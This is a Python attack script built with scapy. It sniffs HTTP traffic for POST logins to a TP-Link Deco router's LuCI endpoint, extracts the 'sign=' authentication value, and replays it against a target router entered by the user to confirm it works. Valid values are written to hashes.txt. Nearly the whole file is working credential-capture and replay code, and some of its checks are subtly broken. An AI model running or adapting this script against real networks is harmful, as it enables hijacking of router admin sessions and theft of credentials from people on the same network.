import requests
from scapy import data
from scapy.all import *

def check_sign(sign):
    data = {
        sign.encode()
    }
    rq = requests.post('http://' + ip + '/cgi-bin/luci/;stok=/login', data=data)
    if rq.status_code == 200:
        return True
    else:
        return False

def http_header(packet):
        print("[+] PACKET: " + packet["IP"].src + " -> " + packet["IP"].dst)
        http_packet=str(packet)
        if http_packet.find('192.168.68.1'):
            if http_packet.find('/cgi-bin/luci/;stok=/login'):
                if http_packet.find('POST'):
                        return POST_print(packet)

def POST_print(packet1):
    if "sign=" in "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n")):
        data = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        data = data.split('sign=',1)[1].split('\r',1)[0]
        data = "sign=" + data
        if check_sign(data):
            print("[+] FOUND VALID KEY")
            with open("hashes.txt", "a") as f:
                f.write(str(data) + "\n")
            exit()
        else:
            pass

global ip
ip = input("[+] Enter target Deco IP Address: ")
print("[+] LISTENING FOR PACKETS...")
sniff(iface='enp4s0', prn=http_header, filter="tcp port 80")
